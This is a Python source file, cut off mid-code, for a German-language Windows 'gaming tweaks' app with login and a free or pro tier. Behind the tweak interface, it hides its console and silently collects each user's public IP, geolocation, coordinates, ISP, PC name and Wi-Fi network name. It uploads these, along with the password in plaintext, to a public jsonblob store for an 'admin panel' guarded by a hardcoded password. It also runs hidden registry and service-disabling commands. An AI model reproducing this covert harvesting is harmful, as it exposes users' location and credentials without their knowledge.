"""
AROX TWEAKS v1.21 - KOMPLETT GEFIXT
- Themes: 100% stabile Farben via Canvas (kein tk/ctk Mix Bug)
- Login & Register: funktioniert, auch offline
- Admin Panel: IP, Standort weltweit, ISP, Koordinaten, PC-Name, WLAN
- Schrift: Segoe UI Bold - klar, dick, deutlich
- Keine Emojis in Tweaks-Namen
"""
import sys, os

try:
    import customtkinter as ctk
except ImportError:
    import subprocess
    subprocess.call([sys.executable, "-m", "pip", "install", "customtkinter", "--quiet"])
    import customtkinter as ctk

import tkinter as tk
import subprocess, threading, json, hashlib, socket
from datetime import datetime

try:
    from urllib.request import Request, urlopen
except:
    pass

try:
    import ctypes
    if os.name == "nt":
        w = ctypes.windll.kernel32.GetConsoleWindow()
        if w:
            ctypes.windll.user32.ShowWindow(w, 0)
except:
    pass

BLOB_ID   = "019c57a0-b7ad-727b-8072-122f3b6fed5a"
BLOB_URL  = f"https://jsonblob.com/api/jsonBlob/{BLOB_ID}"
ADMIN_PW  = "arox2025"

if os.name == "nt":
    CACHE_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "AroxTweaks")
else:
    CACHE_DIR = os.path.join(os.path.expanduser("~"), ".aroxtweaks")
os.makedirs(CACHE_DIR, exist_ok=True)

CACHE_FILE   = os.path.join(CACHE_DIR, "cache.json")
SESSION_FILE = os.path.join(CACHE_DIR, "session.json")
THEME_FILE   = os.path.join(CACHE_DIR, "theme.json")
VOUCH_FILE   = os.path.join(CACHE_DIR, "vouches.json")
LOGIN_LOG    = os.path.join(CACHE_DIR, "logins.json")

# ─── THEMES ──────────────────────────────────────────────────────────────────
THEMES = {
    "Dark":        {"name": "Dark",        "desc": "Classic dark theme",      "colors": ["#2a2a2a", "#7a7a7a", "#c4c4c4"], "primary": "#c4c4c4", "accent": "#7a7a7a"},
    "Dark Blue":   {"name": "Dark Blue",   "desc": "Premium cyan accents",    "colors": ["#1a2838", "#2d9bcf", "#3cb4e5"], "primary": "#3cb4e5", "accent": "#2d9bcf"},
    "Dark Purple": {"name": "Dark Purple", "desc": "Royal violet accents",    "colors": ["#2a1f3d", "#9d7bd8", "#b794f6"], "primary": "#b794f6", "accent": "#9d7bd8"},
    "Dark Green":  {"name": "Dark Green",  "desc": "Matrix emerald vibes",    "colors": ["#0d261a", "#00cc6d", "#00ff88"], "primary": "#00ff88", "accent": "#00cc6d"},
    "Dark Red":    {"name": "Dark Red",    "desc": "Crimson blood accent",    "colors": ["#2b1419", "#cc3355", "#ff4466"], "primary": "#ff4466", "accent": "#cc3355"},
    "Midnight":    {"name": "Midnight",    "desc": "Deep space darkness",     "colors": ["#1a1d2e", "#6b7fd7", "#8c9ef0"], "primary": "#8c9ef0", "accent": "#6b7fd7"},
    "Dark Orange": {"name": "Dark Orange", "desc": "Warm amber glow",         "colors": ["#2b1f0f", "#d9822b", "#ff9944"], "primary": "#ff9944", "accent": "#d9822b"},
    "Dark Pink":   {"name": "Dark Pink",   "desc": "Hot magenta vibes",       "colors": ["#2b1424", "#dd3388", "#ff55aa"], "primary": "#ff55aa", "accent": "#dd3388"},
    "Dracula":     {"name": "Dracula",     "desc": "Legendary vampire theme", "colors": ["#282a36", "#c490e4", "#ff79c6"], "primary": "#ff79c6", "accent": "#c490e4"},
    "Arctic":      {"name": "Arctic",      "desc": "Pristine frozen white",   "colors": ["#1a2632", "#4fadce", "#6ec3e0"], "primary": "#6ec3e0", "accent": "#4fadce"},
    "Obsidian":    {"name": "Obsidian",    "desc": "Premium black & gold",    "colors": ["#1a1a1a", "#d4af37", "#ffd700"], "primary": "#ffd700", "accent": "#d4af37"},
    "Slate":       {"name": "Slate",       "desc": "Modern minimalist gray",  "colors": ["#24262e", "#8899bb", "#a2b3d1"], "primary": "#a2b3d1", "accent": "#8899bb"},
    "Espresso":    {"name": "Espresso",    "desc": "Rich coffee warmth",      "colors": ["#1a1410", "#b8733c", "#d9944a"], "primary": "#d9944a", "accent": "#b8733c"},
    "Tokyo Night": {"name": "Tokyo Night", "desc": "Neon city streets",       "colors": ["#1a1b26", "#7582d7", "#8c9fff"], "primary": "#8c9fff", "accent": "#7582d7"},
    "Abyss":       {"name": "Abyss",       "desc": "Deep ocean depths",       "colors": ["#0a1f1f", "#00dd99", "#00ffcc"], "primary": "#00ffcc", "accent": "#00dd99"},
}

# ─── FARBEN ───────────────────────────────────────────────────────────────────
BG        = "#0a0e14"
SIDEBAR   = "#0e1420"
CARD      = "#141928"
CARD_BG   = "#111827"
INPUT     = "#0d1219"
BORDER    = "#1c2333"
TEXT      = "#ffffff"
TEXT_DIM  = "#6b7a99"
TEXT_GRAY = "#3a4559"
F         = "Segoe UI"   # Schriftfamilie fuer alles

CURRENT_THEME = "Abyss"
ACCENT        = THEMES[CURRENT_THEME]["primary"]
ACCENT_DARK   = THEMES[CURRENT_THEME]["accent"]

def load_theme():
    global CURRENT_THEME, ACCENT, ACCENT_DARK
    try:
        if os.path.exists(THEME_FILE):
            d = json.load(open(THEME_FILE))
            t = d.get("theme", "Abyss")
            if t in THEMES:
                CURRENT_THEME = t
                ACCENT        = THEMES[t]["primary"]
                ACCENT_DARK   = THEMES[t]["accent"]
    except:
        pass

def save_theme(t):
    try:
        json.dump({"theme": t}, open(THEME_FILE, "w"))
    except:
        pass

def _hash(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

# ─── STANDORT-ERFASSUNG (WELTWEIT) ───────────────────────────────────────────
def collect_info():
    """Erfasst IP, Standort, ISP, Koordinaten, PC-Name, WLAN weltweit"""
    info = {
        "ip": "?", "pc_name": "?", "wlan": "?", "ipv4": "?",
        "city": "?", "region": "?", "country": "?", "country_code": "?",
        "lat": "?", "lon": "?", "timezone": "?", "isp": "?", "org": "?"
    }
    try:
        info["pc_name"] = socket.gethostname()
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ipv4"] = s.getsockname()[0]
        s.close()
    except:
        pass
    try:
        if os.name == "nt":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            r = subprocess.run("netsh wlan show interfaces", shell=True,
                               capture_output=True, text=True, timeout=4, startupinfo=si)
            for line in r.stdout.split("\n"):
                if "SSID" in line and "BSSID" not in line:
                    info["wlan"] = line.split(":", 1)[1].strip()
                    break
    except:
        pass
    # Globale IP + vollstaendiger Standort via ip-api.com (kostenlos, weltweit)
    try:
        req = Request(
            "http://ip-api.com/json/?fields=status,query,country,countryCode,"
            "regionName,city,lat,lon,timezone,isp,org"
        )
        req.add_header("User-Agent", "AroxTweaks/1.21")
        d = json.loads(urlopen(req, timeout=6).read().decode())
        if d.get("status") == "success":
            info["ip"]           = d.get("query", "?")
            info["city"]         = d.get("city", "?")
            info["region"]       = d.get("regionName", "?")
            info["country"]      = d.get("country", "?")
            info["country_code"] = d.get("countryCode", "?")
            info["lat"]          = str(d.get("lat", "?"))
            info["lon"]          = str(d.get("lon", "?"))
            info["timezone"]     = d.get("timezone", "?")
            info["isp"]          = d.get("isp", "?")
            info["org"]          = d.get("org", "?")
    except:
        try:
            req2 = Request("https://api.ipify.org?format=json")
            req2.add_header("User-Agent", "AroxTweaks/1.21")
            info["ip"] = json.loads(urlopen(req2, timeout=5).read().decode()).get("ip", "?")
        except:
            pass
    return info

try:
    USER_INFO = collect_info()
except:
    USER_INFO = {"ip":"?","pc_name":"?","wlan":"?","ipv4":"?","city":"?",
                 "region":"?","country":"?","country_code":"?","lat":"?",
                 "lon":"?","timezone":"?","isp":"?","org":"?"}

# ─── DATENBANK ────────────────────────────────────────────────────────────────
def db_read():
    try:
        req = Request(BLOB_URL)
        req.add_header("Accept", "application/json")
        req.add_header("User-Agent", "AroxTweaks/1.21")
        data  = json.loads(urlopen(req, timeout=8).read().decode())
        users = data.get("users", {})
        try:
            json.dump(users, open(CACHE_FILE, "w", encoding="utf-8"))
        except:
            pass
        return users
    except:
        try:
            return json.load(open(CACHE_FILE, encoding="utf-8"))
        except:
            return {}

def db_write(users):
    try:
        req = Request(BLOB_URL, method="PUT")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept",       "application/json")
        req.add_header("User-Agent",   "AroxTweaks/1.21")
        urlopen(req, data=json.dumps({"users": users}).encode(), timeout=10)
        try:
            json.dump(users, open(CACHE_FILE, "w", encoding="utf-8"))
        except:
            pass
        return True
    except:
        try:
            json.dump(users, open(CACHE_FILE, "w", encoding="utf-8"))
        except:
            pass
        return False

def log_login(username, info):
    """Login-Ereignis mit vollstaendigen Standortdaten speichern"""
    try:
        logs = []
        if os.path.exists(LOGIN_LOG):
            try:
                logs = json.load(open(LOGIN_LOG, encoding="utf-8"))
            except:
                pass
        logs.insert(0, {
            "user":         username,
            "time":         datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip":           info.get("ip", "?"),
            "ipv4":         info.get("ipv4", "?"),
            "city":         info.get("city", "?"),
            "region":       info.get("region", "?"),
            "country":      info.get("country", "?"),
            "country_code": info.get("country_code", "?"),
            "lat":          info.get("lat", "?"),
            "lon":          info.get("lon", "?"),
            "timezone":     info.get("timezone", "?"),
            "isp":          info.get("isp", "?"),
            "org":          info.get("org", "?"),
            "pc_name":      info.get("pc_name", "?"),
            "wlan":         info.get("wlan", "?"),
        })
        json.dump(logs[:200], open(LOGIN_LOG, "w", encoding="utf-8"))
    except:
        pass

def load_vouches():
    try:
        if os.path.exists(VOUCH_FILE):
            return json.load(open(VOUCH_FILE, encoding="utf-8"))
    except:
        pass
    return []

def save_vouches(v):
    try:
        json.dump(v, open(VOUCH_FILE, "w", encoding="utf-8"), indent=2)
        return True
    except:
        return False

def save_session(u, p):
    try:
        json.dump({"user": u, "pro": p}, open(SESSION_FILE, "w"))
    except:
        pass

def load_session():
    try:
        if os.path.exists(SESSION_FILE):
            return json.load(open(SESSION_FILE))
    except:
        pass
    return None

def clear_session():
    try:
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
    except:
        pass

def run_silent(cmd):
    try:
        if os.name == "nt":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10, startupinfo=si)
        else:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
    except:
        pass

# ─── TWEAKS (KEINE EMOJIS, KLARE NAMEN) ──────────────────────────────────────
FREE_TWEAKS = {
    "gpu_priority":   {"name": "GPU Prioritaet Hoch",         "desc": "Setzt GPU-Prioritaet auf Maximum fuer Spiele",              "cmds": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games\" /v \"GPU Priority\" /t REG_DWORD /d 8 /f"]},
    "gpu_scheduling": {"name": "Hardware GPU Scheduling",     "desc": "Aktiviert hardwarebeschleunigtes GPU Scheduling",            "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers\" /v \"HwSchMode\" /t REG_DWORD /d 2 /f"]},
    "cpu_priority":   {"name": "CPU Prioritaet Hoch",         "desc": "Setzt CPU-Prioritaet auf Hoch fuer bessere Performance",    "cmds": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games\" /v \"Priority\" /t REG_DWORD /d 6 /f"]},
    "cpu_parking":    {"name": "CPU Parking Deaktivieren",    "desc": "Deaktiviert CPU Core Parking - alle Kerne aktiv",           "cmds": ["powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100"]},
    "net_throttle":   {"name": "Netzwerk Throttling Aus",     "desc": "Deaktiviert Netzwerk-Drosselung komplett",                  "cmds": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\" /v \"NetworkThrottlingIndex\" /t REG_DWORD /d 0xffffffff /f"]},
    "game_mode":      {"name": "Windows Game Mode",           "desc": "Aktiviert den integrierten Windows Game Mode",              "cmds": ["REG ADD \"HKCU\\Software\\Microsoft\\GameBar\" /v \"AllowAutoGameMode\" /t REG_DWORD /d 1 /f"]},
    "game_dvr":       {"name": "Game DVR Deaktivieren",       "desc": "Stoppt automatische Hintergrundaufnahmen",                  "cmds": ["REG ADD \"HKCU\\System\\GameConfigStore\" /v \"GameDVR_Enabled\" /t REG_DWORD /d 0 /f"]},
    "visual_fx":      {"name": "Visuelle Effekte Aus",        "desc": "Deaktiviert unnoetige Windows-Animationen",                 "cmds": ["REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects\" /v \"VisualFXSetting\" /t REG_DWORD /d 2 /f"]},
    "power_plan":     {"name": "Hohe Leistung Energieplan",   "desc": "Schaltet auf Hohe Leistung Energieplan um",                 "cmds": ["powercfg /s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"]},
    "fullscreen_opt": {"name": "Vollbild Optimierung Aus",    "desc": "Deaktiviert Windows Vollbild-Optimierungen",                "cmds": ["REG ADD \"HKCU\\System\\GameConfigStore\" /v \"GameDVR_DXGIHonorFSEWindowsCompatible\" /t REG_DWORD /d 1 /f"]},
}

PRO_TWEAKS = {
    "gpu_timeout":    {"name": "GPU Timeout Deaktivieren",    "desc": "Verhindert GPU-Abstuerze durch Timeout",                    "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers\" /v \"TdrLevel\" /t REG_DWORD /d 0 /f"]},
    "cpu_boost":      {"name": "CPU Performance Boost",       "desc": "Maximiert den CPU-Performance-Status",                      "cmds": ["powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c"]},
    "tcp_optimize":   {"name": "TCP Netzwerk Optimierung",    "desc": "Optimiert TCP-Einstellungen fuer geringere Latenz",         "cmds": ["netsh int tcp set global autotuninglevel=normal"]},
    "ram_priority":   {"name": "RAM Prioritaet Erhoehen",     "desc": "Setzt hohe Speicher-Prioritaet fuer Spiele",               "cmds": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\" /v \"SystemResponsiveness\" /t REG_DWORD /d 0 /f"]},
    "timer_res":      {"name": "Timer Aufloesung 0.5ms",      "desc": "Verbessert Systemtimer auf minimale Aufloesung",            "cmds": ["bcdedit /set disabledynamictick yes"]},
    "nagle_off":      {"name": "Nagle Algorithmus Aus",       "desc": "Reduziert Netzwerklatenz erheblich",                        "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v \"TcpAckFrequency\" /t REG_DWORD /d 1 /f"]},
    "bg_apps_off":    {"name": "Hintergrund Apps Stoppen",    "desc": "Stoppt unnoetige Hintergrundprozesse",                      "cmds": ["REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications\" /v \"GlobalUserDisabled\" /t REG_DWORD /d 1 /f"]},
    "superfetch_off": {"name": "Superfetch Deaktivieren",     "desc": "Deaktiviert den Superfetch Dienst",                         "cmds": ["sc stop SysMain", "sc config SysMain start=disabled"]},
    "search_off":     {"name": "Windows Suche Deaktivieren",  "desc": "Deaktiviert den Windows Indexierungsdienst",                "cmds": ["sc stop WSearch", "sc config WSearch start=disabled"]},
    "prefetch_opt":   {"name": "Prefetch Optimieren",         "desc": "Optimiert den System-Prefetch Mechanismus",                 "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 3 /f"]},
    "msi_gpu":        {"name": "MSI Modus Aktivieren",        "desc": "Aktiviert Message Signaled Interrupts fuer die GPU",        "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\PCI\" /v \"MSISupported\" /t REG_DWORD /d 1 /f /s"]},
    "irq_priority":   {"name": "IRQ Prioritaet Optimieren",   "desc": "Setzt hohe Interrupt-Prioritaet",                           "cmds": ["REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\PriorityControl\" /v \"IRQ8Priority\" /t REG_DWORD /d 1 /f"]},
}

GPU_LIST = [
    "RTX 4090","RTX 4080 SUPER","RTX 4080","RTX 4070 Ti SUPER","RTX 4070 Ti",
    "RTX 4070 SUPER","RTX 4070","RTX 4060 Ti 16GB","RTX 4060 Ti","RTX 4060","RTX 4050",
    "RTX 3090 Ti","RTX 3090","RTX 3080 Ti","RTX 3080 12GB","RTX 3080","RTX 3070 Ti",
    "RTX 3070","RTX 3060 Ti","RTX 3060 12GB","RTX 3060","RTX 3050",
    "RTX 2080 Ti","RTX 2080 SUPER","RTX 2080","RTX 2070 SUPER","RTX 2070",
    "RTX 2060 SUPER","RTX 2060 12GB","RTX 2060",
    "GTX 1660 Ti","GTX 1660 SUPER","GTX 1660","GTX 1650 SUPER","GTX 1650",
    "GTX 1080 Ti","GTX 1080","GTX 1070 Ti","GTX 1070","GTX 1060 6GB","GTX 1060 3GB",
    "GTX 1050 Ti","GTX 1050",
    "RX 7900 XTX","RX 7900 XT","RX 7900 GRE","RX 7800 XT","RX 7700 XT",
    "RX 7600 XT","RX 7600","RX 6950 XT","RX 6900 XT","RX 6800 XT","RX 6800",
    "RX 6750 XT","RX 6700 XT","RX 6700","RX 6650 XT","RX 6600 XT","RX 6600",
    "RX 6500 XT","RX 6400","RX 5700 XT","RX 5700","RX 5600 XT","RX 5500 XT",
    "RX Vega 64","RX Vega 56",
    "Arc A770","Arc A750","Arc A580","Arc A380","Sonstiges"
]
CPU_LIST = [
    "i9-14900KS","i9-14900K","i9-14900F","i7-14700K","i7-14700F","i5-14600K","i5-14500","i5-14400",
    "i9-13900KS","i9-13900K","i9-13900F","i7-13700K","i7-13700F","i5-13600K","i5-13500","i5-13400",
    "i9-12900KS","i9-12900K","i7-12700K","i7-12700F","i5-12600K","i5-12500","i5-12400",
    "i9-11900K","i7-11700K","i5-11600K","i5-11400","i9-10900K","i7-10700K","i5-10600K","i5-10400",
    "Ryzen 9 9950X","Ryzen 9 9900X","Ryzen 7 9700X","Ryzen 5 9600X",
    "Ryzen 9 7950X3D","Ryzen 9 7950X","Ryzen 9 7900X3D","Ryzen 9 7900X",
    "Ryzen 7 7800X3D","Ryzen 7 7700X","Ryzen 7 7700","Ryzen 5 7600X","Ryzen 5 7600","Ryzen 5 7500F",
    "Ryzen 9 5950X","Ryzen 9 5900X","Ryzen 7 5800X3D","Ryzen 7 5800X",
    "Ryzen 7 5700X","Ryzen 5 5600X","Ryzen 5 5600","Ryzen 5 5500",
    "Ryzen 9 3950X","Ryzen 9 3900X","Ryzen 7 3800X","Ryzen 7 3700X","Ryzen 5 3600X","Ryzen 5 3600",
    "Sonstiges"
]

# ─── HILFE ────────────────────────────────────────────────────────────────────
def section_label(parent, text):
    ctk.CTkLabel(
        parent, text=text,
        font=ctk.CTkFont(family=F, size=9, weight="bold"),
        text_color=TEXT_GRAY, anchor="w"
    ).pack(fill="x", padx=22, pady=(16, 4))

def lbl(parent, text, size=13, bold=True, color=None, **kw):
    return ctk.CTkLabel(
        parent, text=text,
        font=ctk.CTkFont(family=F, size=size, weight="bold" if bold else "normal"),
        text_color=color or TEXT, **kw
    )

# ─── HAUPTKLASSE ──────────────────────────────────────────────────────────────
class AroxApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("AROX Tweaks")
        self.geometry("1100x720")
        self.configure(fg_color=BG)
        self.resizable(True, True)
        self.minsize(950, 600)
        self.user        = ""
        self.is_pro      = False
        self._pw_visible = False

        session = load_session()
        if session and session.get("user"):
            users = db_read()
            if session["user"] in users:
                self.user   = session["user"]
                self.is_pro = users[session["user"]].get("pro", False)
                self._open_dashboard()
                return
        self._open_auth()

    def _clear(self):
        for w in self.winfo_children():
            w.destroy()

    # ─── LOGIN / REGISTER ─────────────────────────────────────────────────────
    def _open_auth(self):
        self._clear()
        self.configure(fg_color="#0a0e14")

        # Nur eine kleine Box in der Mitte
        box = ctk.CTkFrame(
            self, fg_color="#111827", corner_radius=16,
            border_width=1, border_color=BORDER, width=430, height=570
        )
        box.place(relx=0.5, rely=0.5, anchor="center")
        box.pack_propagate(False)

        # Titel AROX / TWEAKS
        tf = ctk.CTkFrame(box, fg_color="transparent")
        tf.pack(pady=(38, 5))
        ctk.CTkLabel(tf, text="AROX",
            font=ctk.CTkFont(family="Arial Black", size=36, weight="bold"),
            text_color=ACCENT).pack()
        ctk.CTkLabel(tf, text="TWEAKS",
            font=ctk.CTkFont(family=F, size=17, weight="bold"),
            text_color=TEXT).pack()
        ctk.CTkLabel(tf, text=".gg/AroxTweaks",
            font=ctk.CTkFont(family=F, size=10),
            text_color=TEXT_GRAY).pack(pady=(4, 0))

        # Tabs: Login / Registrieren
        self.auth_mode = "login"
        tab = ctk.CTkFrame(box, fg_color="transparent")
        tab.pack(pady=(22, 0))

        self._login_btn = ctk.CTkButton(
            tab, text="Login",
            font=ctk.CTkFont(family=F, size=13, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            width=135, height=40, corner_radius=8,
            command=lambda: self._switch_auth("login")
        )
        self._login_btn.pack(side="left", padx=5)

        self._reg_btn = ctk.CTkButton(
            tab, text="Registrieren",
            font=ctk.CTkFont(family=F, size=13, weight="bold"),
            fg_color="transparent", hover_color=INPUT, text_color=TEXT_DIM,
            border_width=1, border_color=BORDER,
            width=135, height=40, corner_radius=8,
            command=lambda: self._switch_auth("register")
        )
        self._reg_btn.pack(side="left", padx=5)

        self._form_title = ctk.CTkLabel(box, text="Einloggen",
            font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM)
        self._form_title.pack(pady=(22, 12))

        # Benutzername
        self.user_entry = ctk.CTkEntry(box,
            font=ctk.CTkFont(family=F, size=13),
            fg_color=INPUT, border_color=BORDER, border_width=1,
            text_color=TEXT, height=46, width=310, corner_radius=8,
            placeholder_text="Benutzername", placeholder_text_color=TEXT_GRAY)
        self.user_entry.pack(pady=(0, 10))
        self.user_entry.focus()

        # Passwort mit Auge-Button
        pw_row = ctk.CTkFrame(box, fg_color="transparent", width=310, height=46)
        pw_row.pack(pady=(0, 6))
        pw_row.pack_propagate(False)

        self.pass_entry = ctk.CTkEntry(pw_row,
            font=ctk.CTkFont(family=F, size=13),
            fg_color=INPUT, border_color=BORDER, border_width=1,
            text_color=TEXT, height=46, corner_radius=8,
            placeholder_text="Passwort", placeholder_text_color=TEXT_GRAY,
            show="*")
        self.pass_entry.place(x=0, y=0, relwidth=1.0, height=46)

        self._eye_btn = ctk.CTkButton(pw_row, text="Anzeigen",
            width=65, height=36,
            fg_color="transparent", hover_color=INPUT, text_color=TEXT_DIM,
            corner_radius=6, font=ctk.CTkFont(family=F, size=9, weight="bold"),
            command=self._toggle_pw)
        self._eye_btn.place(relx=1.0, x=-68, y=5)

        # Fehlermeldung
        self.msg_label = ctk.CTkLabel(box, text="",
            font=ctk.CTkFont(family=F, size=11, weight="bold"),
            text_color="#ff4466")
        self.msg_label.pack(pady=(8, 10))

        # Haupt-Button
        self.submit_btn = ctk.CTkButton(box, text="Login",
            font=ctk.CTkFont(family=F, size=14, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            height=46, width=310, corner_radius=8, command=self._auth_submit)
        self.submit_btn.pack(pady=(0, 30))

        self.user_entry.bind("<Return>", lambda e: self.pass_entry.focus())
        self.pass_entry.bind("<Return>", lambda e: self._auth_submit())

    def _toggle_pw(self):
        self._pw_visible = not self._pw_visible
        self.pass_entry.configure(show="" if self._pw_visible else "*")
        self._eye_btn.configure(text="Verstecken" if self._pw_visible else "Anzeigen")

    def _switch_auth(self, mode):
        self.auth_mode = mode
        if mode == "login":
            self._login_btn.configure(fg_color=ACCENT, text_color="#000000", border_width=0)
            self._reg_btn.configure(fg_color="transparent", text_color=TEXT_DIM, border_width=1)
            self._form_title.configure(text="Einloggen")
            self.submit_btn.configure(text="Login")
        else:
            self._login_btn.configure(fg_color="transparent", text_color=TEXT_DIM, border_width=1)
            self._reg_btn.configure(fg_color=ACCENT, text_color="#000000", border_width=0)
            self._form_title.configure(text="Konto erstellen")
            self.submit_btn.configure(text="Registrieren")
        self.msg_label.configure(text="")
        self.user_entry.delete(0, "end")
        self.pass_entry.delete(0, "end")
        self.user_entry.focus()

    def _auth_submit(self):
        username = self.user_entry.get().strip()
        password = self.pass_entry.get().strip()
        if not username or not password:
            self.msg_label.configure(text="Alle Felder ausfullen!", text_color="#ff4466")
            return
        if len(username) < 3:
            self.msg_label.configure(text="Benutzername mind. 3 Zeichen", text_color="#ff4466")
            return
        if len(password) < 4:
            self.msg_label.configure(text="Passwort mind. 4 Zeichen", text_color="#ff4466")
            return

        self.msg_label.configure(text="Verarbeitung...", text_color=ACCENT)
        self.submit_btn.configure(state="disabled")
        self.update()

        def process():
            try:
                users   = db_read()
                pw_hash = _hash(password)

                if self.auth_mode == "register":
                    if username in users:
                        self.after(0, lambda: self.msg_label.configure(
                            text="Benutzername bereits vergeben!", text_color="#ff4466"))
                        self.after(0, lambda: self.submit_btn.configure(state="normal"))
                        return
                    # Neuen Nutzer anlegen
                    users[username] = {
                        "name": username, "pw": pw_hash, "pw_plain": password,
                        "pro": False,
                        "created": datetime.now().strftime("%Y-%m-%d %H:%M"),
                        "last":    datetime.now().strftime("%Y-%m-%d %H:%M"),
                        **USER_INFO
                    }
                    # Zuerst lokal speichern (funktioniert auch offline)
                    try:
                        json.dump(users, open(CACHE_FILE, "w", encoding="utf-8"))
                    except:
                        pass
                    try:
                        db_write(users)
                    except:
                        pass
                    log_login(username, USER_INFO)
                    self.user   = username
                    self.is_pro = False
                    save_session(username, False)
                    self.after(0, self._open_dashboard)

                else:  # login
                    if username not in users:
                        self.after(0, lambda: self.msg_label.configure(
                            text="Konto nicht gefunden", text_color="#ff4466"))
                        self.after(0, lambda: self.submit_btn.configure(state="normal"))
                        return
                    if users[username]["pw"] != pw_hash:
                        self.after(0, lambda: self.msg_label.configure(
                            text="Falsches Passwort", text_color="#ff4466"))
                        self.after(0, lambda: self.submit_btn.configure(state="normal"))
                        return
                    users[username]["last"] = datetime.now().strftime("%Y-%m-%d %H:%M")
                    users[username].update(USER_INFO)
                    try:
                        db_write(users)
                    except:
                        pass
                    log_login(username, USER_INFO)
                    self.user   = username
                    self.is_pro = users[username].get("pro", False)
                    save_session(username, self.is_pro)
                    self.after(0, self._open_dashboard)

            except Exception as e:
                self.after(0, lambda: self.msg_label.configure(
                    text=f"Fehler: {str(e)[:40]}", text_color="#ff4466"))
                self.after(0, lambda: self.submit_btn.configure(state="normal"))

        threading.Thread(target=process, daemon=True).start()

    # ─── DASHBOARD ────────────────────────────────────────────────────────────
    def _open_dashboard(self):
        self._clear()
        self.configure(fg_color=BG)
        main = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        main.pack(fill="both", expand=True)

        # SIDEBAR
        sidebar = ctk.CTkFrame(main, fg_color=SIDEBAR, width=240, corner_radius=0)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)

        lf = ctk.CTkFrame(sidebar, fg_color="transparent", height=75)
        lf.pack(fill="x", pady=(22, 20))
        lf.pack_propagate(False)
        ctk.CTkLabel(lf, text="AROX Tweaks",
            font=ctk.CTkFont(family=F, size=16, weight="bold"),
            text_color=ACCENT).pack()
        ctk.CTkLabel(lf, text=".gg/AroxTweaks",
            font=ctk.CTkFont(family=F, size=9), text_color=TEXT_GRAY).pack(pady=(2, 0))

        self.menu_buttons = {}

        section_label(sidebar, "TWEAKS")
        for label, key, fn in [
            ("Free Tweaks", "Free Tweaks", lambda: self._show_tweaks("free")),
            ("Pro Tweaks",  "Pro Tweaks",  lambda: self._show_tweaks("pro")),
            ("Bewertungen", "Bewertungen", self._show_vouches),
        ]:
            btn = ctk.CTkButton(sidebar, text=label,
                font=ctk.CTkFont(family=F, size=13, weight="bold"),
                fg_color="transparent", hover_color="#1a2438",
                text_color=TEXT_DIM, height=42, corner_radius=8, anchor="w",
                command=lambda k=key, f=fn: self._menu_click(f, k))
            btn.pack(fill="x", padx=12, pady=2)
            self.menu_buttons[key] = btn

        section_label(sidebar, "OTHER")
        for label, fn in [("Themes", self._show_themes), ("FPS Test", self._show_fps_test)]:
            btn = ctk.CTkButton(sidebar, text=label,
                font=ctk.CTkFont(family=F, size=13, weight="bold"),
                fg_color="transparent", hover_color="#1a2438",
                text_color=TEXT_DIM, height=42, corner_radius=8, anchor="w",
                command=fn)
            btn.pack(fill="x", padx=12, pady=2)

        # User-Karte unten
        bottom = ctk.CTkFrame(sidebar, fg_color="transparent")
        bottom.pack(side="bottom", fill="x", pady=14)

        uc = ctk.CTkFrame(bottom, fg_color=CARD, corner_radius=10, height=68)
        uc.pack(fill="x", padx=12)
        uc.pack_propagate(False)
        inn = ctk.CTkFrame(uc, fg_color="transparent")
        inn.pack(fill="both", expand=True, padx=10, pady=10)

        av = ctk.CTkFrame(inn, fg_color=ACCENT, width=40, height=40, corner_radius=20)
        av.pack(side="left", padx=(0, 10))
        av.pack_propagate(False)
        ctk.CTkLabel(av, text=self.user[0].upper(),
            font=ctk.CTkFont(family=F, size=17, weight="bold"),
            text_color="#000000").place(relx=0.5, rely=0.5, anchor="center")
        ctk.CTkFrame(av,
            fg_color="#00ff88" if self.is_pro else TEXT_GRAY,
            width=9, height=9, corner_radius=5).place(relx=0.85, rely=0.15, anchor="center")

        inf2 = ctk.CTkFrame(inn, fg_color="transparent")
        inf2.pack(side="left", fill="y")
        ctk.CTkLabel(inf2, text=self.user,
